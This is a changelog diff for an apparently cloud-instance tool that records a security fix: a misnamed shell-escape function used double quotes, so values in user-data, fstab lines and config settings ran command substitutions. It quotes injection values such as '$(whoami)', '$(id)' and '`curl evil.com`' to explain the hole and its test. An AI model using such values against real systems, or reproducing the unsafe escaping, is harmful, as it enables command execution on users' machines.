@@ -7,6 +7,41 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+
+- **`security.ShellEscape` is deleted; every caller now uses real single-quoting**
+  (#680). It was `strconv.Quote` — Go/C escaping inside **double** quotes, where a POSIX
+  shell still expands `$VAR`, `$(…)` and backticks — while being named as though it were
+  the safe choice. Deleted rather than deprecated, because the name was the trap: it was
+  the obvious thing to reach for, and it was the unsafe one.
+  **The storage user-data was the worst of it.** Mount points, mount options, filesystem
+  DNS names and device names all went through it, producing three distinct defects for an
+  ordinary EFS mount point:
+  `mkdir -p "/efs$(id -u)"` ran the substitution at boot; `echo "export EFS_MOUNT="/efs""`
+  nested quotes and was correct only by accident; and `/my efs` rendered as
+  `export EFS_MOUNT=/my`, leaving `efs` to be run as a command on **every login** —
+  a path with a space is legal and needs nothing exotic. The fstab lines interpolated the
+  mount point raw into a double-quoted `echo`, so a substitution executed there too; they
+  are now single-quoted as a whole, since fstab wants literal text. The attached-volume
+  lines use `printf` with the path quoted, because `$SPAWN_DEV` must still expand.
+  **`spawn config set` executed values instead of storing them.** The key and value come
+  from argv and the result runs on the instance, so `spawn config set k '$(id)'` ran `id`
+  there. It also meant a value containing `$` simply could not be stored.
+  Also: the dead `shellEscape` template registration in the MPI user-data is removed
+  (#660 moved `--mpi-command` out of the template, leaving an unused escaper for the next
+  person to reach for), and the pipeline-orchestrator lambda stopped interpolating a
+  stage command **twice** — escaped into `STAGE_CMD`, and raw into
+  `echo "Running stage command: …"`, where `$(…)` executed, and executed again when the
+  stage really ran, so a substitution with side effects happened twice.
+  A gate now fails the build on any `func ShellEscape(` or `strconv.Quote` in
+  `pkg/security`. It is worth a gate rather than a comment because a **passing** test
+  called `TestShellEscapeAttackPatterns` fed in `$(whoami)` and `` `curl evil.com` `` and
+  asserted only that the result *started with a double quote* — the very property that
+  made it unsafe. A test named for attack patterns was certifying the hole. Its input
+  list is kept and now run through a **real shell**, requiring each value to round-trip
+  byte for byte.
+
+
 ### Fixed
 
 - **`--vpc` is now honoured; it previously launched in the default VPC regardless**
